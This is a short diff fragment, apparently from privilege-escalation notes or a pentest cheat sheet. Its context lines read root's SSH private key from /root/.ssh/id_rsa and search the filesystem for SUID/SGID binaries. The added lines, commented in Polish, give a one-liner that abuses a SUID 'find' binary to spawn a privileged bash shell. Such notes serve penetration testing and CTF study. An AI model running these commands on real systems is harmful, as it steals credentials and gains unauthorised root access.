@@ -30,3 +30,6 @@ cat /root/.ssh/id_rsa
 
 # Find files with SUID or GUID flags set
 find / -perm -u=s -o -perm -g=s 2>/dev/null
+
+# Uruchomienie Basha przez SUID find
+/usr/bin/find . -exec /bin/bash -p \; -quit
